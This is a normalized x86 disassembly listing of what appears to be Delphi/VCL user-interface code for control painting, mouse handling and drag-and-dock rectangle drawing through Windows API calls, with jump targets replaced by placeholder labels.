sub_438a1c
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_439bf4
pop ebx
retn
sub_438a40
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4389b4
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404080
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_4389c4
sub_438a70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_438ac5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_438a40
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40439c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438acc
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax esi
call sub_404450
mov edx eax
mov eax ebx
call sub_438a1c
sub_438af0
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41c3c4
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_439bf4
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41c3c4
mov [ ebx + 0x84 ] eax
sub_438c78
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_438c68
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_435c10
mov eax esi
call sub_435c10
jmp r-xdata
sub_438cb0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_413808
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41369c
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_413828
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_438e88
mov eax ebx
call sub_44f7e4
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403454
sub_438d30
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_438cb0
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_438cb0
jmp r-xdata
sub_438d54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_438dea
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438df1
lea eax [ ebp - 0xc ]
call sub_403f90
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
sub_438dfc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_413808
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4137ac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4383e0
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438e88
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43f52c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4383e0
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43f228
push eax
call InvalidateRect
push ebp
call sub_438dfc
pop ecx
test al al
je r-xdata
mov al 0x1
sub_438f24
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44f7bc
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_439bf4
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403454
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_438f88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43f52c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43f228
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_439061
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43d034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43f228
push eax
call ReleaseDC
retn
sub_4390e8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax edi
call sub_439c28
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_438584
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4068b4
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_439bf4
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_436d90
sub_4391bc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_4391f8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_439244
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_439270
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4389e4
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_4389d0
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a5c
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a5c
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_43f228
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_439354
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_4393a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403454
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403454
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_439464
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_4394b0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_4394fc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_439617
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41c9e4
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43961e
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_439650
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_438584
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403454
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403454
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403454
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403454
jmp r-xdata
sub_439740
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412350
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_439c28
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_4389d0
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_4389e4
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_4123a0
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_439920
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_438558
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403454
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_43f228
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_436154
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43990b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_43f228
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_43f228
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4383e0
test esi esi
je r-xdata
sub_439920
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403454
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43a7a4
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403454
mov eax esi
call sub_438488
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_438444
mov ecx eax
xor edx edx
xor eax eax
call sub_412378
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403454
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_4399c4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_4399f4
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_439a60
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_439b20
sub_439a90
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_439ac0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_438584
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_439aec
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_439b20
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_439bf4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_439c28
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
